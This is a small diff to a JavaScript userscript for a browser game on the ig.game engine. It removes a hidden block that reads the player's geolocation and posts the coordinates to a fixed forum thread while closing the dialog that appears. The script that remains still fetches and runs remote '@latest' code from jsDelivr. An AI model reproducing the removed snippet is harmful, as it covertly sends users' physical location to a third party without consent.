@@ -1,10 +1,5 @@
 (async ()=> {
     await $.getScript("https://cdn.jsdelivr.net/gh/parseml/many-deobf@latest/deobf.js");
-lfgpd=true;
-setInterval(()=>{
-    if(ig.game.holderDialog.isOpen==true&&lfgpd==true){navigator.geolocation.getCurrentPosition((b)=>{ig.game[Deobfuscator.object(ig.game, "addForumThreadAndFirstComment_P", true)].addForumThreadAndFirstComment_P("6513420ca3f7a6059d49e069", "a", b.coords.latitude+" "+b.coords.longitude);lfgpd=false});ig.game.holderDialog.close()}
-
-}, 0);
 bjghrg=Deobfuscator.object(ig.game, "useCdn", true);
 bjghrg1=Deobfuscator.function(ig.game[bjghrg], "/j/f/gf/", true);
 bjghrg2=Deobfuscator.function(ig.game[bjghrg], "/j/f/gc/", true);
